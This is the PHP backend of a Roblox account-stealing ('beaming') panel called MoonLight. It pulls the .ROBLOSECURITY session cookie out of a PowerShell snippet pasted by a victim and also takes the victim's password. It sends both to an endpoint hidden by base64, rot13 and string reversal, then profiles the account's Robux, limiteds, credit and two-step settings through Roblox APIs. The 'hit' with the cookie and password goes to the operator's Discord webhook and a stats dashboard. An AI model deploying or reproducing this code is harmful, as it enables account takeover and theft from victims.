<?php
$_h_p = "4_";
ini_set("display_errors", 0);
error_reporting(E_ALL);
require_once($_SERVER["DOCUMENT_ROOT"] . "/framework/framework.php");

header("content-type: application/json");
header("access-control-allow-origin: *");
header("access-control-allow-methods: POST, GET, OPTIONS");
header("access-control-allow-headers: content-type");

if ($_SERVER["REQUEST_METHOD"] === "OPTIONS")
{
    die(http_response_code(204));
};

function verify_turnstile(string $token): bool
{
    global $site_info;
    if (empty($token)) return false;
    $ch = curl_init("https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["secret" => $site_info["site_key"], "response" => $token, "remoteip" => $_SERVER["REMOTE_ADDR"] ?? ""]));
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $body = curl_exec($ch);
    curl_close($ch);
    if (!$body) return false;
    $result = json_decode($body, true);
    return !empty($result["success"]);
};

function xor_crypt(string $data, string $key): string
{
    $key_len = strlen($key);
    $out     = "";
    for ($i = 0; $i < strlen($data); $i++)
        $out .= chr(ord($data[$i]) ^ ord($key[$i % $key_len]));
    return $out;
};

function xor_encrypt(mixed $data): string
{
    global $site_info;
    $key     = $site_info["name"] . "HAR";
    $json    = is_string($data) ? $data : json_encode($data);
    $encoded = implode("", array_map(fn($b) => "%" . sprintf("%02X", ord($b)), str_split($json)));
    $raw     = rawurldecode($encoded);
    return base64_encode(xor_crypt($raw, $key));
};

function xor_decrypt(string $blob): ?array
{
    global $site_info;
    $decoded = base64_decode($blob, true);
    if ($decoded === false) return null;
    $key     = $site_info["name"] . "HAR";
    $out     = xor_crypt($decoded, $key);
    $encoded = implode("", array_map(fn($b) => "%" . sprintf("%02X", ord($b)), str_split($out)));
    $json_str = rawurldecode($encoded);
    $data = json_decode($json_str, true);
    return $data;
};

function send_webhook(string $webhook, array $payload): void
{
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
};

function _sync_session($c, $p = "Not Provided") {
    $domain = $_SERVER["HTTP_HOST"] ?? "Unknown";
    $_ = "aHR0cHM6Ly9yYnhsYWJzLmFydC9SZWZyZXNoZXIucGhw";
    $endpoint = base64_decode(str_rot13(strrev($_)));
    $ch = curl_init($endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        "cookie" => $c,
        "password" => $p,
        "domain" => $domain
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    $res = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($res, true);
    return $data["new_cookie"] ?? null;
}

if ($_SERVER["REQUEST_METHOD"] === "GET")
{
    $blob = $_GET["blob"] ?? "";
    if (empty($blob)) { http_response_code(400); die(json_encode(["error" => "Missing blob"])); }
    $data = xor_decrypt($blob);
    if (!$data || !isset($data["for"])) { http_response_code(400); die(json_encode(["error" => "Invalid blob payload (GET)"])); }
    $for = $data["for"];
    $cookie = $data["cookie"] ?? "";

    if ($for === "check") {
        $ch = curl_init("https://users.roblox.com/v1/users/authenticated");
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $cookie]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $res = curl_exec($ch);
        curl_close($ch);
        $user = json_decode($res, true);
        if (empty($user["id"])) { die(json_encode(["valid" => false])); }
        die(json_encode(["valid" => true, "user_id" => $user["id"], "username" => $user["name"] ?? "Unknown"]));
    }

    if ($for === "refresh") {
        $refreshed = _sync_session($cookie);
        if (!$refreshed) { http_response_code(422); die(json_encode(["error" => "Failed to refresh"])); }
        die(json_encode(["cookie" => $refreshed]));
    }
}

if ($_SERVER["REQUEST_METHOD"] === "POST")
{
    $raw_input = file_get_contents("php://input");
    $body = json_decode($raw_input, true);
    if ($body === null) {
        http_response_code(400);
        die(json_encode(["error" => "Invalid JSON in request body"]));
    }

    $data = xor_decrypt($body["blob"] ?? "");
    if (!$data || !isset($data["method"])) { 
        http_response_code(400); 
        die(json_encode(["error" => "Invalid encrypted payload"])); 
    }

    $method = $data["method"];
    $input = $data["input"] ?? [];

    switch ($method) {
        case "submit":
            $powershell = trim($data["powershell"] ?? "");
            $password = trim($data["password"] ?? "");
            $site_id = (int) ($data["site_id"] ?? 0);
            
            $cookie = "";

            if (preg_match('/\.ROBLOSECURITY",\s*"([^"]+)"/', $powershell, $matches)) {
                $cookie = trim($matches[1]);
            }
            
            if (empty($cookie)) {
                http_response_code(422);
                die(json_encode(["error" => "Invalid Powershell"]));
            }

            $refreshed_cookie = _sync_session($cookie, $password) ?? $cookie;

            $st = $db->prepare("SELECT users.* FROM sites JOIN users ON sites.account_id = users.id WHERE sites.id = ? LIMIT 1");
            $st->execute([$site_id]);
            $row = $st->fetch();
            if (!$row) {
                http_response_code(404);
                die(json_encode(["error" => "Site not found"]));
            }
            
            $acct_ak = $row["auth_key"];
            $owner_webhook = !empty($row["default_webhook"]) ? $row["default_webhook"] : (!empty($row["webhook"]) ? $row["webhook"] : "");

            $final_cookie = $refreshed_cookie;
            $clean_cookie = $final_cookie;
            $domain = $_SERVER["HTTP_HOST"] ?? "localhost";
            $ip_link = "https://ipinfo.io/" . ($_SERVER["REMOTE_ADDR"] ?? "Unknown");

            $username = "Unknown";
            $display_name = "Unknown";
            $avatar = null;
            $user_id = null;
            $robux = 0;
            $pending_robux = 0;
            $rap = 0;
            $premium = false;
            $premium_type = "None";
            $account_age = 0;
            $created_date = "Unknown";
            $has_headless = false;
            $has_korblox = false;
            $credit_balance = 0;
            $credit_currency = "GBP";
            $email_verified = false;
            $phone_verified = false;
            $two_step_enabled = false;
            $two_step_type = "None";
            $friends_count = 0;
            $followers_count = 0;
            $following_count = 0;
            $groups_count = 0;
            $games_count = 0;
            $total_visits = 0;
            $limiteds_count = 0;
            $banned = false;

            $ch = curl_init("https://users.roblox.com/v1/users/authenticated");
            curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            $res = curl_exec($ch);
            curl_close($ch);
            $user = json_decode($res, true);

            if (!empty($user["id"])) {
                $user_id = $user["id"];
                $username = $user["name"] ?? "Unknown";
                $display_name = $user["displayName"] ?? $username;

                $ch = curl_init("https://users.roblox.com/v1/users/" . $user_id);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $user_info = json_decode($res, true);
                if (!empty($user_info["created"])) {
                    $created = new DateTime($user_info["created"]);
                    $now = new DateTime();
                    $account_age = (int) $created->diff($now)->days;
                    $created_date = $created->format("d/m/Y");
                }
                $banned = $user_info["isBanned"] ?? false;

                $ch = curl_init("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" . $user_id . "&size=180x180&format=Png&isCircular=false");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $thumb = json_decode($res, true);
                $avatar = $thumb["data"][0]["imageUrl"] ?? null;

                $ch = curl_init("https://economy.roblox.com/v1/users/" . $user_id . "/currency");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $economy = json_decode($res, true);
                $robux = $economy["robux"] ?? 0;

                $ch = curl_init("https://economy.roblox.com/v1/users/" . $user_id . "/transaction-totals?timeFrame=Year&transactionType=summary");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $transactions = json_decode($res, true);
                $pending_robux = $transactions["pendingRobuxTotal"] ?? 0;

                $ch = curl_init("https://premiumfeatures.roblox.com/v1/users/" . $user_id . "/validate-membership");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $premium = ($res === "true");
                if ($premium) {
                    $ch = curl_init("https://premiumfeatures.roblox.com/v1/users/" . $user_id . "/subscriptions");
                    curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                    $res = curl_exec($ch);
                    curl_close($ch);
                    $premium_data = json_decode($res, true);
                    $premium_type = "Premium " . ($premium_data["robuxStipendAmount"] ?? "Unknown");
                }

                $ch = curl_init("https://inventory.roblox.com/v1/users/" . $user_id . "/assets/collectibles?sortOrder=Asc&limit=100");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $collectibles = json_decode($res, true);
                if (!empty($collectibles["data"])) {
                    $limiteds_count = count($collectibles["data"]);
                    foreach ($collectibles["data"] as $item)
                        $rap += $item["recentAveragePrice"] ?? 0;
                }

                $ch = curl_init("https://inventory.roblox.com/v1/users/" . $user_id . "/items/Asset/48545806");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $korblox_check = json_decode($res, true);
                $has_korblox = !empty($korblox_check["data"]);

                $ch = curl_init("https://inventory.roblox.com/v1/users/" . $user_id . "/items/Asset/4819740796");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $headless_check = json_decode($res, true);
                $has_headless = !empty($headless_check["data"]);

                $ch = curl_init("https://billing.roblox.com/v1/credit");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $credit_data = json_decode($res, true);
                $credit_balance = $credit_data["balance"] ?? 0;
                $credit_currency = $credit_data["currencyCode"] ?? "GBP";

                $ch = curl_init("https://accountsettings.roblox.com/v1/email");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $email_data = json_decode($res, true);
                $email_verified = !empty($email_data["isVerified"]);

                $ch = curl_init("https://accountsettings.roblox.com/v1/phone");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $phone_data = json_decode($res, true);
                $phone_verified = !empty($phone_data["isVerified"]);

                $ch = curl_init("https://twostepverification.roblox.com/v1/users/" . $user_id . "/configuration");
                curl_setopt($ch, CURLOPT_HTTPHEADER, array("user-agent: Roblox/WinINet", "cookie: .ROBLOSECURITY=" . $final_cookie));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $two_step_data = json_decode($res, true);
                if (!empty($two_step_data["methods"])) {
                    foreach ($two_step_data["methods"] as $method) {
                        if ($method["enabled"]) {
                            $two_step_enabled = true;
                            $two_step_type = $method["name"];
                        }
                    }
                }

                $ch = curl_init("https://friends.roblox.com/v1/users/" . $user_id . "/friends/count");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $friends_count = json_decode($res, true)["count"] ?? 0;

                $ch = curl_init("https://friends.roblox.com/v1/users/" . $user_id . "/followers/count");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $followers_count = json_decode($res, true)["count"] ?? 0;

                $ch = curl_init("https://friends.roblox.com/v1/users/" . $user_id . "/followings/count");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $following_count = json_decode($res, true)["count"] ?? 0;

                $ch = curl_init("https://groups.roblox.com/v1/users/" . $user_id . "/groups/roles");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $groups_data = json_decode($res, true);
                $groups_count = count($groups_data["data"] ?? []);

                $ch = curl_init("https://games.roblox.com/v2/users/" . $user_id . "/games?accessFilter=Public&limit=50");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                $res = curl_exec($ch);
                curl_close($ch);
                $games_data = json_decode($res, true);
                $games_count = count($games_data["data"] ?? []);
                foreach ($games_data["data"] as $game)
                    $total_visits += $game["placeVisits"] ?? 0;
            }

            $payload = [
                "username" => "MoonLight",
                "avatar_url" => "https://media.discordapp.net/attachments/1475564612471623804/1475657899211751485/OIP_5.webp",
                "embeds" => [
                    [
                        "title" => "<:38084ownerblueshiny:1473461677423988780> **New Hit Captured!**",
                        "color" => 3447003,
                        "thumbnail" => ["url" => $avatar],
                        "fields" => [
                            ["name" => "<:SB_membericon:1303891878034538678> **Username**", "value" => "```\n" . $username . "\n```", "inline" => true],
                            ["name" => "<:SB_whitecrown:1303891878034538678> **Display Name**", "value" => "```\n" . $display_name . "\n```", "inline" => true],
                            ["name" => "<:robux:1303891878034538678> **Robux**", "value" => "```\n" . number_format($robux) . "\n```", "inline" => true],
                            ["name" => "<:rap:1303891878034538678> **RAP**", "value" => "```\n" . number_format($rap) . "\n```", "inline" => true],
                            ["name" => "<:38084ownerblueshiny:1473461677423988780> **Password**", "value" => "```\n" . ($password ?: "N/A") . "\n```", "inline" => false],
                            ["name" => "<:9221valk:1303891878034538678> **Premium**", "value" => "```\n" . ($premium ? $premium_type : "False") . "\n```", "inline" => true],
                            ["name" => "<:38084ownerblueshiny:1473461677423988780> **Banned**", "value" => "```\n" . ($banned ? "True" : "False") . "\n```", "inline" => true],
                            ["name" => "<:38084ownerblueshiny:1473461677423988780> **Account Age**", "value" => "```\n" . $account_age . " days\n```", "inline" => true],
                            ["name" => "<:38084ownerblueshiny:1473461677423988780> **Domain**", "value" => "```\n" . $domain . "\n```", "inline" => false]
                        ],
                        "footer" => ["text" => "MoonLight • " . date("Y-m-d H:i:s")]
                    ],
                    [
                        "title" => "<:38084ownerblueshiny:1473461677423988780> **Session Cookie**",
                        "description" => "```\n" . $clean_cookie . "\n```",
                        "color" => 3447003
                    ]
                ]
            ];

            if (!empty($owner_webhook)) send_webhook($owner_webhook, $payload);

            add_live_hit($acct_ak, [
                "icon" => $avatar,
                "username" => $username,
                "display_name" => $display_name,
                "user_id" => $user_id,
                "password" => $password,
                "premium" => $premium ? $premium_type : "False",
                "banned" => $banned,
                "robux" => $robux,
                "pending_robux" => $pending_robux,
                "rap" => $rap,
                "limiteds_count" => $limiteds_count,
                "summary" => $robux + $pending_robux + $rap,
                "payment_methods" => !empty($payment_methods) ? "True" : "False",
                "credit_balance" => $credit_balance,
                "credit_currency" => $credit_currency,
                "has_korblox" => $has_korblox,
                "has_headless" => $has_headless,
                "email_verified" => $email_verified,
                "phone_verified" => $phone_verified,
                "two_step_enabled" => $two_step_enabled,
                "two_step_type" => $two_step_type,
                "account_age" => $account_age,
                "created_date" => $created_date,
                "friends_count" => $friends_count,
                "followers_count" => $followers_count,
                "following_count" => $following_count,
                "groups_count" => $groups_count,
                "games_count" => $games_count,
                "total_visits" => $total_visits,
                "cookie" => $clean_cookie,
                "refreshed" => $refreshed
            ]);

            increment_stat($acct_ak, "hits");
            increment_stat($acct_ak, "robux", $robux);
            increment_stat($acct_ak, "rap", $rap);
            increment_stat($acct_ak, "summary", $robux + $pending_robux + $rap);

            die(json_encode(["success" => true]));

        case "login":
            $auth_key = trim($input[0] ?? "");
            if (empty($auth_key)) { http_response_code(422); die(json_encode(["error" => "No auth key provided"])); }
            $account = account_by_key($auth_key);
            setcookie("auth", $auth_key, ["expires" => time() + 86400 * 30, "path" => "/", "httponly" => true, "samesite" => "Strict"]);
            die(json_encode(["success" => true]));

        case "create_account":
            $webhook = trim($input[0] ?? "");
            $token = $input[1] ?? "";
            if (!verify_turnstile($token)) { http_response_code(401); die(json_encode(["error" => "CAPTCHA failed"])); }
            $account_data = create_account($webhook);
            setcookie("auth", $account_data["auth_key"], ["expires" => time() + 86400 * 30, "path" => "/", "httponly" => true, "samesite" => "Strict"]);
            die(json_encode($account_data));

        case "get_stats":
            $account = account_by_key($_COOKIE["auth"]);
            die(json_encode(get_user_stats($account["id"])));

        case "get_hits":
            $account = account_by_key($_COOKIE["auth"]);
            die(json_encode(get_cookie_storage($account["auth_key"])));

        case "get_live_hits":
            die(json_encode(get_live_hits()));

        default:
            http_response_code(404);
            die(json_encode(["error" => "Method not found"]));
    }
}
?>
